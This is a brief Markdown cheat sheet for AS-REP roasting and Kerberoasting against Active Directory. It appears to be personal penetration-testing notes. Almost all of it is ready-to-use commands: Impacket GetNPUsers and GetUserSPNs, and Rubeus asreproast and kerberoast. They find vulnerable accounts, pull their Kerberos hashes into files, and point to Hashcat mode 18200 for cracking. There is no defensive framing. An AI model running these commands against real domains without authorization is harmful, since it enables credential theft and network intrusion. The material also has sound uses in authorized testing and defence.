# AS-REP Roasting

## Impacket

```
# Get Users that do not require kerberos preauth
impacket-GetNPUsers -dc-ip <dc IP address> domain/username:"<password>"

# Get hashes of those users
impacket-GetNPUsers -dc-ip <dc IP address> -request -outputfile <outfile> domain/username:"<password>"
```

## Rubeus

```
.\Rubeus.exe asreproast /nowrap
```

Hashcat module: ```18200```

# Kerberoasting

## Impacket

```
sudo impacket-GetUserSPNs -dc-ip <dc IP address> domain/username:"<password>"

sudo impacket-GetUserSPNs -dc-ip <dc IP address> -request -outputfile <outfile> domain/username:"<password>"
```

## Rubeus

```
.\Rubeus.exe kerberoast /outfile:<outfilename>
```